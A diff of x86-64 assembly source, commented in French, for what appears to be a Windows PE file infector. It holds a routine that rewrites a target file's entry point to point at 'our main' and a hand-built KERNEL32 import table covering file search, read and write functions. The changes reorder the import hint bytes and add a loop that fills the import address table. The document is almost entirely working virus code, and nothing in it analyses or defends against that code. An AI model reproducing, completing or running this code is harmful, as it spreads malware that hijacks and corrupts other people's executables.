@@ -288,7 +288,7 @@ handle_file proc ; int handle
 
 	add rax, r13
 	mov eax, dword ptr [rsp + 56]
-	mov dword ptr [r15], eax ; on modifie l'entry point par notre main
+	mov dword ptr [r15], eax ; on modifie l'entry point par notre main ;            IMPORTANT 
 
 	add r15, 40
 	mov eax, dword ptr [rsp + 56]
@@ -607,17 +607,17 @@ ft_strequ endp
 
 KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h
 
-FindFirstFileA_NAME db 01h, 7dh, 'FindFirstFileA',0h
-FindNextFileA_NAME	db 01h, 8eh, 'FindNextFileA',0h
-ReadFile_NAME		db 04h, 70h, 'ReadFile',0h
-CreateFileA_NAME	db 00h, 0c2h,'CreateFileA',0h
-GetFileSize_NAME	db 02h, 4eh, 'GetFileSize',0h
-SetFilePointer_NAME	db 05h, 28h, 'SetFilePointer',0h
-WriteFile_NAME		db 06h, 19h, 'WriteFile',0h
-GetProcessHeap_NAME	db 02h, 0b7h,'GetProcessHeap',0h
-HeapAlloc_NAME		db 03h, 4ah, 'HeapAlloc',0h
+FindFirstFileA_NAME db 7dh, 01h, 'FindFirstFileA',0h
+FindNextFileA_NAME	db 8eh, 01h, 'FindNextFileA',0h
+ReadFile_NAME		db 70h, 04h, 'ReadFile',0h
+CreateFileA_NAME	db 0c2h,00h, 'CreateFileA',0h
+GetFileSize_NAME	db 4eh, 02h, 'GetFileSize',0h
+SetFilePointer_NAME	db 28h, 05h, 'SetFilePointer',0h
+WriteFile_NAME		db 19h, 06h, 'WriteFile',0h
+GetProcessHeap_NAME	db 0b7h,02h, 'GetProcessHeap',0h
+HeapAlloc_NAME		db 4ah, 03h, 'HeapAlloc',0h
 
-COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12
+COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 00
 
 init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	push rbp
@@ -736,11 +736,31 @@ fin_boucle_ft_trouver_fin:
 
 	lea r8, COUNT
 
+	add rcx, qword ptr [rsp + 64]
+	sub rcx, qword ptr [rsp + 56]
+	sub rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+
+	
 	; rbx = fin oft
 	; rax = fin ft
-	; rdx = fin tableau_noms
+	; rcx = fin tableau_noms
 	; r8 = count
 	
+debut_boucle_remplir_la_ft:
+	mov qword ptr [rbx], rcx
+	mov qword ptr [rax], rcx
+	add rax, 8
+	add rbx, 8
+
+	xor r9, r9
+	mov r9b, byte ptr [r8]
+	add rcx, r9 ; rcx += *count
+
+	inc r8 ; count++
+	cmp byte ptr [r8], 0
+	je fin_boucle_remplir_la_ft
+	jmp debut_boucle_remplir_la_ft
+fin_boucle_remplir_la_ft:
 	
 	mov rsp, rbp
 	pop rbp
